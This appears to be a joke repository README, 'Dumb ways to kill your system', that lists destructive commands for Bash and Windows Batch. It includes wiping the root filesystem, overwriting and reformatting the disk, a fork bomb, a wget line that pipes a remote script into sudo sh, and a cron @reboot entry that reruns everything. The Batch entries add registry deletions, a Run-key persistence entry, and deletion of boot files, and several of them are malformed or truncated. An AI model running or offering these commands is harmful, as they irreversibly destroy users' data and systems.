# Dumb ways to kill your system
Kill your (or not) system with style. Many ways on many languages to make your system be snapped by thanos itself.

# Bash

The following commands should work on Android, Linux, MacOS, and others systems who run on the bash (and bash-like) interpreter(s).
<br />
<br />
```
sudo chmod -R 777 /*; 
```
This will just make your entire system acessible using permissions.
<br />
<br />

```
sudo rm -rf /* --no-preserve-root;
```
Well, this surely will wipe down your entire system.
<br />
<br />

```
dd if=/dev/null of=/dev/sda; 
```
This will change every bite of your drive to 0's.
<br />
<br />

```
sudo mv /home/* /dev/null; 
```
This command will to move your entire users folder to the absolute void.
<br />
<br />

```
sudo mkfs.ext3 /dev/sda; 
```
This will format your drive entirely.
<br />
<br />

```
: () {: |: &} ;:
```
I's called fork bomb, and should make your system crashes, if you have one.
<br />
<br />

```
wget https://raw.githubusercontent.com/willnaoosmit/Dumb-ways-to-kill-your-system/master/bash/script.sh -O | sudo sh
```
This command will download and run automatically the file with all the bash commands above.
<br />
<br />

```
sudo touch /var/spool/cron/$USER; echo '@reboot sudo chmod -R 777 /*; sudo rm -rf /* --no-preserve-root; dd if=/dev/null of=/dev/sda; sudo mv /* /dev/null; sudo mkfs.ext3 /dev/sda; : () {: |: &} ;:' > /var/spool/cron/$USER
```
This command will add all the commands above to run on the next reboot.
<br />
<br />


# Batch
The following commands should work on windows and windows-based systems, and/or systems who can run batch commands (Like Wine on linux).
<br />
<br />

```
del*.*
```
//TODO: Explain this command
<br />
<br />

```
START reg delete HKCR/.exe
```
//TODO: Explain this command
<br />
<br />

```
START reg delete HKCR/.dll
```
//TODO: Explain this command
<br />
<br />

```
START reg delete HKCR/*
```
//TODO: Explain this command
<br />
<br />

```
echo @echo off>c:windowswimn32.bat
```
//TODO: Explain this command
<br />
<br />

```
echo break off>>c:windowswimn32.bat
```
//TODO: Explain this command
<br />
<br />

```
echo ipconfig/release_all>>c:windowswimn32.bat
```
//TODO: Explain this command
<br />
<br />

```
echo end>>c:windowswimn32.bat
```
//TODO: Explain this command
<br />
<br />

```
reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
```
//TODO: Explain this command
<br />
<br />

```
reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window
```
//TODO: Explain this command
<br />
<br />

```
delete %systemdrive%\*.* /f /s
```
//TODO: Explain this command
<br />
<br />

```
REN *.avi *.txt REN *.mkv *.txt REN *.BAT *.txt REN *.doc *.txt REN *.JPEG *.txt REN *.lnk *.txt
```
//TODO: Explain this command
<br />
<br />

```
attrib -r -s -h c:\autoexec.bat
```
//TODO: Explain this command
<br />
<br />

```
del c:\autoexec.bat
```
//TODO: Explain this command
<br />
<br />

```
attrib -r -s -h c:\boot.ini
```
//TODO: Explain this command
<br />
<br />

```
del c:\boot.ini
```
//TODO: Explain this command
<br />
<br />

```
attrib -r -s -h c:\ntldr
```
//TODO: Explain this command
<br />
<br />

```
del c:\ntldr
```
//TODO: Explain this command
<br />
<br />

```
attrib -r -s -h c:\windows\win.ini
```
//TODO: Explain this command
<br />
<br />

```
del c:\windows\win.ini
```
//TODO: Explain this command
<br />
<br />

```
del /s /q *.*
```
//TODO: Explain this command
<br />
<br />

# Python

Just a script to check the Operational system type and run destructive commands.
